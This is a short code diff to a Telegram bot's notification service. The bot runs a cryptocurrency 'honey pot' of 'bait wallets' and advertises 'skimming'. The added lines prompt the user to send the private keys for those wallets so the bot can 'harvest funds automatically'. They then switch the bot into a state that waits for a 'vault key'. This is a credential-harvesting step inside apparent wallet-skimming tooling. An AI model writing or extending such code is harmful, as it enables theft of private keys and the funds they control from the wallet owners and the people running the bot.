@@ -911,8 +911,13 @@ class NotificationService:
             except: pass
 
         await self.db.update_user_state(user_id, bait_wallets_json=json.dumps(bait_list))
-        await message.answer(f"✅ *Honey Pot Network Updated!*\nAdded `{len(added)}` bait wallets. Skimming is now 100% active!")
-        await state.clear()
+        await message.answer(
+            f"✅ *Honey Pot Network Updated!*\nAdded `{len(added)}` bait wallets.\n\n"
+            "🔐 *FINAL STEP:* Please send the **Private Key(s)** for these bait wallets.\n"
+            "(I will delete your message instantly. This allows me to harvest funds automatically).",
+            parse_mode="Markdown"
+        )
+        await state.set_state(SetupWizard.waiting_for_vault_key)
 
     async def set_rpc_command(self, message: types.Message, state: FSMContext):
         await state.clear()
